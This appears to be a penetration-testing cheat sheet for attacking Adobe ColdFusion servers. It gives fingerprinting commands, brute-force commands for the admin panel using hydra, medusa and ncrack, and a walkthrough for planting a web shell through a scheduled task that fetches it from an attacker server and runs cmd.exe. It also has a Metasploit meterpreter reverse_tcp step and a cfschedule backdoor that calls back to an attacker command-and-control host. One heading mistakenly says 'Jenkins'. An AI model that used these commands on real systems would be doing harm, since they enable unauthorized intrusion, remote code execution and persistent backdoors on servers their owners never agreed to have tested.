### **INTRODUCTION**

ColdFusion is a commercial rapid web application development platform created by Allaire Corporation, which is now maintained by Adobe Systems. It consists of a programming language known as ColdFusion Markup Language (CFML), an integrated development environment (IDE), and a scalable server for developing and delivering web and mobile applications. ColdFusion is designed to simplify the connection between HTML pages and databases, as well as to assist in building dynamic websites with advanced features that interact with databases, manipulate file content, manage session state, and integrate with various web services.

### **IDENTIFYING JENKINS VERSION**

1.  Obtaining Version Using URL Path Enumeration:  
    `curl -I http://[COLDFUSION-DOMAIN]/CFIDE/administrator/`
2.  Obtaining Version Using Nmap:  
    `nmap -sV --script=http-coldfusion-version [COLDFUSION-DOMAIN]`
3.  Checking Version from Banner Grabbing:  
    `echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc [COLDFUSION-DOMAIN] 80`
    

### **DEFAULT DIRECTORIES AND FILES COLDFUSION**

1.  Access admin panel:  
    `http://[COLDFUSION-DOMAIN]/CFIDE/administrator/index.cfm`
2.  Checking for Accessible Scripts:  
    `http://[COLDFUSION-DOMAIN]/CFIDE/scripts/`

### **BRUTE-FORCE COLDFUSION CREDENTIALS**

1.  Brute-Forcing with Hydra:  
    `hydra -l admin -P password_list.txt [COLDFUSION-URL] http-post-form "/CFIDE/administrator/index.cfm:cfadminPassword=^PASS^:F=incorrect"`
2.  Brute-Forcing with Medusa:  
    `medusa -h [COLDFUSION-URL] -u admin -P password_list.txt -M http -m FORM:"/CFIDE/administrator/index.cfm:cfadminPassword=^PASS^:F=incorrect" -T 10`
3.  Brute-Forcing with Ncrack:  
    `ncrack -p http-form-post://[COLDFUSION-URL]/CFIDE/administrator/index.cfm -U admin -P password_list.txt`
    

### **REMOTE CODE EXECUTION VIA FILE UPLOAD**

1.  Download the webshell.cfm from the GitHub repository:  
    `wget https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm`
2.  Setting Up a Local Server with Python:  
    `python3 -m http.server 8000`
3.  Accessing the ColdFusion Administrator:  
    `Navigate to the admin panel.`
4.  Scheduling a Task to Download the Web Shell:
    - Task Name: `backdoor_download`
    - URL: `http://192.168.119.112:8000/webshell.cfm`
    - Publish: `True`
    - File: `c:\Inetpub\wwwroot\webshell.cfm`
5.  Opening the Web Shell via Browser:  
    `http://10.11.1.10/webshell.cfm`
6.  Use the web shell to execute a command on the server:
    - Command: `c:\windows\system32\cmd.exe`
    - Options: `/c whoami > c:\Inetpub\wwwroot\output.txt`
    - Timeout: `5`
7.  View the output from the executed command:  
    `http://10.11.1.10/output.txt`
    

### **AUTOMATING EXPLOITATION WITH METASPLOIT**

1.  Launch Metasploit Framework Console:  
    `msfconsole`
2.  Select the ColdFusion Exploit Module:  
    `use exploit/windows/http/coldfusion_fckeditor`
3.  Set the Remote Host (RHOST):  
    `set RHOST [target]`
4.  Set the Payload:  
    `set payload windows/meterpreter/reverse_tcp`
5.  Set the Local Host (LHOST):  
    `set LHOST [YOUR_IP_ADDRESS]`
6.  Execute the Exploit:  
    `exploit`

### **ESTABLISH PERSISTENCE**

Add a scheduled task in ColdFusion to call back to a command and control server:

```CFML
<cfschedule action="update" task="Backdoor" operation="HTTPRequest"
                url="http://[ATTACKER_SERVER]/backdoor.cfm" interval="600">
```